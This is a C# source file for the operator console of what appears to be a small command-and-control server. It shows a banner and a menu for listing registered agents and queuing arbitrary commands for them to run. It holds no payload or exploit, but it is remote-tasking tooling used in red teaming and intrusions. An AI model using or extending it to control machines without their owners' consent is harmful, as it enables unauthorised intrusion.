using System;
using System.Collections.Generic;
using System.Net;
using System.IO;
using System.Text;
using System.Threading.Tasks;

namespace server{
    public class UserInput{
        //Main class for C2 Operator input
        public Listener listener {get; set;}

        public UserInput(Listener listener){
            //pass our listener into this object
            this.listener = listener;
            Console.WriteLine(@"
_________         _________ _               ______   _______ 
\__   __/|\     /|\__   __/( (    /|       (  __  \ (  ____ )
   ) (   | )   ( |   ) (   |  \  ( |       | (  \  )| (    )|
   | |   | (___) |   | |   |   \ | | _____ | |   ) || (____)|
   | |   |  ___  |   | |   | (\ \) |(_____)| |   | ||     __)
   | |   | (   ) |   | |   | | \   |       | |   ) || (\ (   
   | |   | )   ( |___) (___| )  \  |       | (__/  )| ) \ \__
   )_(   |/     \|\_______/|/    )_)       (______/ |/   \__/
                                                             
            ");
        }

        private string Menu(){
            //returns a menu
            //should be made generic and with input
            //in the constructor *theoretically*
            Console.WriteLine("");
            return "C2 Server User Input\n\t[1] Exit the program\n\t[2] List all Clients\n\t[3] Set a Command";
        }

        public void MenuInput(){
            //User input for the server
            //Menu Backend
            bool menuLoop = true;
            while(menuLoop){
                Console.WriteLine(Menu());
                Console.Write("What would you like to do: ");
                string input = Console.ReadLine();
                switch(input){
                    case "1":
                        //exiting our loop here will terminate the server
                        menuLoop = false;
                        break;
                    case "2":
                        Console.WriteLine("Registered Clients:");
                        ListClients();
                        break;
                    case "3":
                        SetCommand();
                        break;
                    default: 
                        Console.WriteLine("\nInvalid input; Please try again.");
                        break;
                }
            }
        }
        public void ListClients(){
            //lists all the registered clients
            List<Agent> agents = this.listener.agents;
            foreach (var agent in agents){
                Console.WriteLine(agent.name);
            }
        }

        public int SetCommand(){
            //set a command for a client to query
            //set the "query buffer" to be json including the hostname and the command
            Console.WriteLine("Type the name of the client you would like to send a command to: ");
            Console.WriteLine("List: ");
            ListClients();
            Console.Write("\n");
            string client = Console.ReadLine();
            foreach (var agent in this.listener.agents){
                if(client == agent.name){
                    Console.WriteLine("What command do you want to run: ");
                    string command = Console.ReadLine();
                    agent.commandQue.AddLast(command);
                    return 0;
                }
            }
            Console.WriteLine("Client not found");
            return 1;
        }
    }
}